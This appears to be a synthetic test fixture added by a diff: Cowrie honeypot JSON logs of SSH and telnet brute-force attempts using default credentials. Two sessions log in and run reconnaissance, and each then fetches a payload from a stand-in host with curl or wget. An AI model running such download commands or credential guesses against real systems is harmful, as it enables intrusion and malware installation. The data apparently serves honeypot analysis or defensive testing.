@@ -1,0 +1,27 @@
+{"eventid":"cowrie.session.connect","timestamp":"2026-09-12T14:00:00.000000Z","session":"alpha01","src_ip":"203.0.113.10","protocol":"ssh","src_port":53122,"dst_port":22}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:00:03.000000Z","session":"alpha01","src_ip":"203.0.113.10","protocol":"ssh","username":"root","password":"123456"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:00:05.000000Z","session":"alpha01","src_ip":"203.0.113.10","protocol":"ssh","username":"root","password":"password"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:00:08.000000Z","session":"alpha01","src_ip":"203.0.113.10","protocol":"ssh","username":"root","password":"toor"}
+{"eventid":"cowrie.login.success","timestamp":"2026-09-12T14:00:11.000000Z","session":"alpha01","src_ip":"203.0.113.10","protocol":"ssh","username":"root","password":"admin123"}
+{"eventid":"cowrie.command.input","timestamp":"2026-09-12T14:00:18.000000Z","session":"alpha01","src_ip":"203.0.113.10","protocol":"ssh","input":"uname -a"}
+{"eventid":"cowrie.command.input","timestamp":"2026-09-12T14:00:24.000000Z","session":"alpha01","src_ip":"203.0.113.10","protocol":"ssh","input":"cat /etc/os-release"}
+{"eventid":"cowrie.command.input","timestamp":"2026-09-12T14:00:31.000000Z","session":"alpha01","src_ip":"203.0.113.10","protocol":"ssh","input":"curl -O http://payload.example/update.sh"}
+{"eventid":"cowrie.session.file_download","timestamp":"2026-09-12T14:00:34.000000Z","session":"alpha01","src_ip":"203.0.113.10","protocol":"ssh","url":"http://payload.example/update.sh","outfile":"downloads/aaaaaaaa","shasum":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
+{"eventid":"cowrie.session.closed","timestamp":"2026-09-12T14:00:49.000000Z","session":"alpha01","src_ip":"203.0.113.10","protocol":"ssh","duration":49.0}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:03:00.000000Z","session":"bravo02","src_ip":"198.51.100.20","protocol":"ssh","username":"admin","password":"welcome"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:03:02.000000Z","session":"bravo02","src_ip":"198.51.100.20","protocol":"ssh","username":"oracle","password":"welcome"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:03:04.000000Z","session":"bravo02","src_ip":"198.51.100.20","protocol":"ssh","username":"pi","password":"welcome"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:03:06.000000Z","session":"bravo02","src_ip":"198.51.100.20","protocol":"ssh","username":"ubuntu","password":"welcome"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:03:08.000000Z","session":"bravo02","src_ip":"198.51.100.20","protocol":"ssh","username":"test","password":"welcome"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:07:00.000000Z","session":"charlie03","src_ip":"192.0.2.30","protocol":"telnet","username":"root","password":"root"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:07:02.000000Z","session":"charlie03","src_ip":"192.0.2.30","protocol":"telnet","username":"admin","password":"admin"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:07:04.000000Z","session":"charlie03","src_ip":"192.0.2.30","protocol":"telnet","username":"user","password":"1234"}
+{"eventid":"cowrie.login.success","timestamp":"2026-09-12T14:07:06.000000Z","session":"charlie03","src_ip":"192.0.2.30","protocol":"telnet","username":"support","password":"support"}
+{"eventid":"cowrie.command.input","timestamp":"2026-09-12T14:07:12.000000Z","session":"charlie03","src_ip":"192.0.2.30","protocol":"telnet","input":"id"}
+{"eventid":"cowrie.command.input","timestamp":"2026-09-12T14:07:16.000000Z","session":"charlie03","src_ip":"192.0.2.30","protocol":"telnet","input":"wget http://mirror.example/agent -O /tmp/agent"}
+{"eventid":"cowrie.session.file_download","timestamp":"2026-09-12T14:07:19.000000Z","session":"charlie03","src_ip":"192.0.2.30","protocol":"telnet","url":"http://mirror.example/agent","outfile":"downloads/bbbbbbbb","shasum":"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:12:00.000000Z","session":"delta04","src_ip":"203.0.113.44","protocol":"ssh","username":"admin","password":"admin"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:12:03.000000Z","session":"delta04","src_ip":"203.0.113.44","protocol":"ssh","username":"admin","password":"admin"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:12:06.000000Z","session":"delta04","src_ip":"203.0.113.44","protocol":"ssh","username":"admin","password":"admin"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:12:09.000000Z","session":"delta04","src_ip":"203.0.113.44","protocol":"ssh","username":"admin","password":"admin"}
+{"eventid":"cowrie.login.failed","timestamp":"2026-09-12T14:18:00.000000Z","session":"echo05","src_ip":"198.51.100.55","protocol":"ssh","username":"guest","password":"guest"}
